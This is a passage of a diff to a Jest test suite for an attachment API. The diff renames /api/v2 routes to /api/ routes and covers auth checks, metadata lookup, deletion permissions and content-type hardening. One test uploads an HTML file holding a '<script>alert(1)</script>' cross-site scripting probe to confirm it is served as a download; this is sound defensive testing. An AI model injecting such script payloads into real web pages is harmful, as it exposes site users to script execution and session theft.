         await Attachment.updateOne({ _id: id }, { $set: { fileFormat: declared } });
 
-        const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+        const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
         expect(res.headers['content-type']).toBe('application/octet-stream');
         expect(res.headers['content-disposition']).toMatch(/^attachment;/);
@@ -1034,7 +1030,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('still serves a genuine image inline, with nosniff', async () => {
       const id = await uploadDeclaring(`xss-png-${Date.now()}`, pngBuffer, 'pixel.png', 'image/png');
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('image/png');
@@ -1044,7 +1040,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     });
 
     it('sets nosniff on a CORS preflight too (the header middleware has to run outside CORS, which answers OPTIONS without calling next())', async () => {
-      const res = await request(app).options('/api/v2/attachments/000000000000000000000000').set('Origin', 'http://localhost:3000');
+      const res = await request(app).options('/api/attachments/000000000000000000000000').set('Origin', 'http://localhost:3000');
 
       expect(res.headers['x-content-type-options']).toBe('nosniff');
     });
@@ -1056,7 +1052,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const Attachment = crowi.model('Attachment');
       await Attachment.updateOne({ _id: id }, { $set: { fileFormat: 'text/html' } });
 
-      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('application/octet-stream');
@@ -1067,7 +1063,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const html = Buffer.from('<script>alert(1)</script>');
       const id = await uploadDeclaring(`xss-orig-${Date.now()}`, html, 'payload.html', 'text/html');
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+      const res = await request(app).get(`/api/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
 
       expect(res.status).toBe(200);
       expect(res.headers['content-type']).toBe('application/octet-stream');
@@ -1075,11 +1071,11 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     });
   });
 
-  describe('GET /api/v2/attachments/:id/meta (single attachment metadata)', () => {
+  describe('GET /api/attachments/:id/meta (single attachment metadata)', () => {
     /** Upload a PNG to a page and return its attachment id. */
     const uploadTo = async (pageId: string) => {
       const res = await request(app)
-        .post(`/api/v2/pages/${pageId}/attachments`)
+        .post(`/api/pages/${pageId}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(res.status).toBe(200);
@@ -1087,19 +1083,19 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     };
 
     it('returns 401 without auth', async () => {
-      const res = await request(app).get('/api/v2/attachments/000000000000000000000000/meta');
+      const res = await request(app).get('/api/attachments/000000000000000000000000/meta');
       expect(res.status).toBe(401);
       expect(res.body.error.code).toBe('AUTHENTICATION_REQUIRED');
     });
 
     it('returns 400 for a malformed id', async () => {
-      const res = await request(app).get('/api/v2/attachments/not-an-objectid/meta').set(authHeaders(accessToken));
+      const res = await request(app).get('/api/attachments/not-an-objectid/meta').set(authHeaders(accessToken));
       expect(res.status).toBe(400);
       expect(res.body.error.code).toBe('INVALID_ATTACHMENT_ID');
     });
 
     it('returns 404 for a non-existent attachment', async () => {
-      const res = await request(app).get('/api/v2/attachments/000000000000000000000000/meta').set(authHeaders(accessToken));
+      const res = await request(app).get('/api/attachments/000000000000000000000000/meta').set(authHeaders(accessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
     });
@@ -1108,7 +1104,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}meta-private`, '# secret', 4 /* GRANT_OWNER */);
       const id = await uploadTo(page._id);
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/meta`).set(authHeaders(otherAccessToken));
+      const res = await request(app).get(`/api/attachments/${id}/meta`).set(authHeaders(otherAccessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
     });
@@ -1117,7 +1113,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}meta-ok`, '# m');
       const id = await uploadTo(page._id);
 
-      const res = await request(app).get(`/api/v2/attachments/${id}/meta`).set(authHeaders(accessToken));
+      const res = await request(app).get(`/api/attachments/${id}/meta`).set(authHeaders(accessToken));
       expect(res.status).toBe(200);
       expect(res.body._id).toBe(id);
       expect(res.body.page).toBe(page._id);
@@ -1131,20 +1127,20 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     });
   });
 
-  describe('DELETE /api/v2/attachments/:id (remove)', () => {
+  describe('DELETE /api/attachments/:id (remove)', () => {
     it('returns 401 without auth', async () => {
-      const res = await request(app).delete('/api/v2/attachments/000000000000000000000000');
+      const res = await request(app).delete('/api/attachments/000000000000000000000000');
       expect(res.status).toBe(401);
     });
 
     it('returns 400 for malformed ids', async () => {
-      const res = await request(app).delete('/api/v2/attachments/not-an-objectid').set(authHeaders(accessToken));
+      const res = await request(app).delete('/api/attachments/not-an-objectid').set(authHeaders(accessToken));
       expect(res.status).toBe(400);
       expect(res.body.error.code).toBe('INVALID_ATTACHMENT_ID');
     });
 
     it('returns 404 for non-existent attachments', async () => {
-      const res = await request(app).delete('/api/v2/attachments/000000000000000000000000').set(authHeaders(accessToken));
+      const res = await request(app).delete('/api/attachments/000000000000000000000000').set(authHeaders(accessToken));
       expect(res.status).toBe(404);
       expect(res.body.error.code).toBe('ATTACHMENT_NOT_FOUND');
     });
@@ -1152,13 +1148,13 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('lets the creator delete the attachment (success)', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-creator`, '# d');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
 
       const id = upload.body.attachment._id;
-      const res = await request(app).delete(`/api/v2/attachments/${id}`).set(authHeaders(accessToken));
+      const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(accessToken));
       expect(res.status).toBe(200);
       expect(res.body.success).toBe(true);
 
@@ -1169,13 +1165,13 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     it('lets an admin delete an attachment owned by another user', async () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-admin`, '# da');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
 
       const id = upload.body.attachment._id;
-      const res = await request(app).delete(`/api/v2/attachments/${id}`).set(authHeaders(adminAccessToken));
+      const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(adminAccessToken));
       expect(res.status).toBe(200);
       expect(res.body.success).toBe(true);
     });
@@ -1185,13 +1181,13 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       // the owning page — not restricted to creator / admin / grantedUsers.
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-anyone`, '# dx');
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', pngBuffer, { filename: 'pixel.png', contentType: 'image/png' });
       expect(upload.status).toBe(200);
 
       const id = upload.body.attachment._id;
-      const res = await request(app).delete(`/api/v2/attachments/${id}`).set(authHeaders(otherAccessToken));
+      const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(otherAccessToken));
       expect(res.status).toBe(200);
       expect(res.body.success).toBe(true);
 
@@ -1203,7 +1199,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       const page = await createPageViaApi(accessToken, `${PATH_PREFIX}delete-original-fails`, '# do');
       const wideJpeg = await createWideJpeg({ r: 1, g: 2, b: 3 });
       const upload = await request(app)
-        .post(`/api/v2/pages/${page._id}/attachments`)
+        .post(`/api/pages/${page._id}/attachments`)
         .set(authHeaders(accessToken))
         .attach('file', wideJpeg, { filename: 'wide.jpg', contentType: 'image/jpeg' });
       expect(upload.status).toBe(200);
@@ -1224,7 +1220,7 @@ describe('Routes /api/v2 attachments (Hono)', () => {
       });
 
       try {
-        const res = await request(app).delete(`/api/v2/attachments/${id}`).set(authHeaders(accessToken));
+        const res = await request(app).delete(`/api/attachments/${id}`).set(authHeaders(accessToken));
         expect(res.status).toBe(500);
         expect(res.body.error.code).toBe('REMOVE_FAILED');
       } finally {
